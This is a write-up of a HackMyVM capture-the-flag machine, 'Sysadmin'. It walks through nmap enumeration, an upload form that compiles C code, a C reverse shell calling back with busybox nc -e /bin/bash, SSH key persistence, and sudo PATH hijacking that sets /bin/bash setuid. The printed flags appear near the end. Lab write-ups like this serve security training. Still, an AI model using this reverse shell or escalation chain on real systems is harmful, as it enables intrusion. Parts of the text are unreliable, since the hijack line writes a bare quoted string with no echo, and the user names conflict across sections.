


# Sysadmin-HMV: [Sysadmin](https://hackmyvm.eu/machines/machine.php?vm=Sysadmin)

---

## Overview

This write-up documents the compromise of the **Sysadmin** machine from HackMyVM.

High-level path:
- Web upload vulnerability allows arbitrary C code execution.
- User shell obtained via uploaded reverse shell C binary.
- Privilege escalation to root by exploiting `sudo` misconfiguration and PATH hijacking.
- Retrieval of user and root flags.

---

## Enumeration

### Nmap Scan

```
# Nmap 7.98 scan initiated Sun Jan  4 03:18:00 2026 as: /usr/lib/nmap/nmap --privileged -v -p- -sC -sV -T4 -oA /home/cool/HMV/sysadmin/scans/nmap-sysadmin-full -oN /home/cool/HMV/sysadmin/scans/nmap-sysadmin-full.log 192.168.56.123
Nmap scan report for sysadmin.hmv (192.168.56.123)
Host is up (0.009s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
```

### Observations

- SSH on **22**
- HTTP on **80**

---

## Web Enumeration (Port 80)

The main web page presents a file upload form, explicitly requesting C source files. Upon submission, the server compiles and executes the uploaded C code.

Inspecting the HTML source reveals a comment:

```
<!-- Compiling with: gcc -std=c11 -nostdinc -I/var/www/include -z execstack -fno-stack-protector -no-pie test.c -o a.out -->
```

This suggests that uploaded C files are compiled using a relatively insecure set of GCC flags.

### GCC Compilation Flags Explained

The compilation command:

```
gcc -std=c11 -nostdinc -I/var/www/include -z execstack -fno-stack-protector -no-pie test.c -o a.out
```

- **-std=c11**: Enforces the C11 standard for source compatibility.
- **-nostdinc**: Prevents the use of system standard include directories, restricting includes to those specified with `-I` (here, `/var/www/include`). This can limit available headers but is not a security feature.
- **-I/var/www/include**: Adds `/var/www/include` as an include directory. Any headers here could be attacker-controlled.
- **-z execstack**: Marks the stack as executable, which is a security anti-pattern. Normally, stacks are non-executable to mitigate certain exploits.
- **-fno-stack-protector**: Disables stack smashing protection (SSP), making buffer overflows easier to exploit.
- **-no-pie**: Disables position-independent executable generation, resulting in a binary with a fixed load address, which can aid exploitation.

Overall, these flags reduce the security of compiled binaries, making exploitation easier.

---

## Initial Access

By uploading a C source file containing a reverse shell payload, arbitrary code execution is achieved.

The following `rs.c` code was uploaded:

```c
int fork();
int execve(const char*, char*const[], char*const[]);

int main() {
    if (fork() == 0) {
        /* Rev Shell */
        char *argv[] = {
            "/bin/sh",
            "-c",
            "busybox nc 192.168.56.1 1234 -e /bin/bash",
            0
        };
        execve(argv[0], argv, 0);
    }
    return 0;
}
```

After uploading and starting a listener, the code was compiled and executed on the target, resulting in a shell as the web server user.

---

## Post-Exploitation / User Access

To stabilize access, an SSH public key was added to the user's `authorized_keys` file.

```zsh
mkdir -p ~/.ssh && chmod 700 ~/.ssh
sshid='<YOUR RSA_ID>'
echo $sshid >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

The user flag was found at:

```
/home/sysadmin/user.txt
```

```
flag{user-9592f6e02a7abaf9e38c0ef43e868cf3}
```

---

## Privilege Escalation

Running `sudo -l` reveals the following:

```
Matching Defaults entries for echo on Sysadmin:
    !env_reset, mail_badpass, !env_reset, always_set_home
User echo may run the following commands on Sysadmin:
    (root) NOPASSWD: /usr/local/bin/system-info.sh
```

Key observations:
- The `!env_reset` option allows the user environment (including PATH) to be preserved.
- No `secure_path` is set, so the user's PATH is used by sudo.
- The script uses unqualified binary names, making it sensitive to PATH hijacking.

The contents of `/usr/local/bin/system-info.sh`:

```bash

#===================================
# Daily System Info Report
#===================================

echo "Starting daily system information collection at $(date)"
echo "------------------------------------------------------"

echo "Checking disk usage..."
df -h

echo "Checking log directory..."
ls -lh /var/log/
find /var/log/ -type f -name "*.gz" -mtime +30 -exec rm {} \;

echo "Checking critical services..."
systemctl is-active sshd
systemctl is-active cron

echo "Collecting CPU and memory information..."
cat /proc/cpuinfo
free -m
```



Because the script references commands like `free`, `cat`, `ls`, `date`, etc without full paths, a user can place malicious executables with these names earlier in their PATH. When the script is run with `sudo`, the malicious binaries are executed as root, resulting in privilege escalation.

This misconfiguration allows code execution with effective UID 0.

---

## Privilege Escalation

```zsh
cd /tmp
"chmod +s /bin/bash" > cat 
chmod +x cat 
export PATH=/tmp/:$PATH
sudo -u root /usr/local/bin/system-info.sh
```

```zsh
bash -p
bash-5.0# 
```

`Since the cat binary was overridden during PATH hijacking, it could no longer be used reliably. The more utility was therefore used to read the root flag.`


```zsh
more /root/root.txt
```


## Flags

### User Flag

```
flag{user-9592f6e02a7abaf9e38c0ef43e868cf3}
```

### Root Flag

```
flag{root-8b8a8b353298f798e3eb8628661617b6}
```

---

## Attack Path Summary

```
HTTP (80) → Upload C file → code execution as www-data
           ↓
Local shell → escalate to sysadmin user
           ↓
sudo -l reveals system-info.sh (no env_reset, no secure_path)
           ↓
PATH hijacking → arbitrary code execution as root
           ↓
Read user + root flags
```
